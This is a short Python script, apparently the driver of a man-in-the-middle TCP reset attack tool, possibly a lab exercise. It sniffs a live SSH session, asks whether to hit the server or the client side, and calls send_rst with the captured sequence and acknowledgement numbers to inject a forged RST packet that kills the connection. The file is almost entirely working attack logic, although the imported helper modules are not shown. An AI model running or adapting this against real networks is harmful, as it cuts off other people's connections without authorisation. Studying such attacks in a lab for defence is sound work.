from hping import send_rst
from monitor import NetworkMonitor
from util import log


def choose_target():
    print("\n========== TARGET ==========")
    print("1. Server")
    print("2. Client")
    while True:
        choice = input("Choose target: ").strip()
        if choice == "1":
            return "SERVER"
        if choice == "2":
            return "CLIENT"
        print("Invalid choice. Enter 1 or 2.")


def main():
    log("MAIN", "starting MITM TCP monitor")
    monitor = NetworkMonitor()
    monitor.start()

    log("MAIN", "waiting for SSH connection to stabilize (open a NEW ssh session now)")
    monitor.wait_for_stability()
    log("MAIN", "connection stabilized")

    target = choose_target()
    try:
        state = monitor.get_state(target)
    except RuntimeError as e:
        log("ERR", str(e))
        return

    send_rst(
        state["source_ip"],
        state["source_port"],
        state["destination_ip"],
        state["destination_port"],
        state["seq"],
        state["ack"],
    )


if __name__ == "__main__":
    main()
